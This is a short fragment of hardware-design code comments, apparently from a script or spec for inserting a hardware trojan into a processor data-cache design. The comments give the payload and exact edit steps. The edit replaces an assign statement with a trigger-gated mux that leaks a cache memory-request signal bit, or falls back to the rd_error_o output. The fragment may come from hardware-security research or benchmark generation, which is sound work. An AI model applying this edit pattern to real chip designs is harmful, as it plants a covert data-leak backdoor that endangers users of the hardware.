 ...
 * Payload: Route dcache_mem_req_write_data_ready_i[0] to observable output
 * 
...
//   Find the assign for dcache_mem_req_write_data_ready_i (or rd_error_o as fallback):
//     assign dcache_mem_req_write_data_ready_i = <normal_expr>;
//   Replace with:
//     assign dcache_mem_req_write_data_ready_i = trojan_active ? dcache_mem_req_write_ready_i[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? dcache_mem_req_write_ready_i[0] : 1'b0;
//
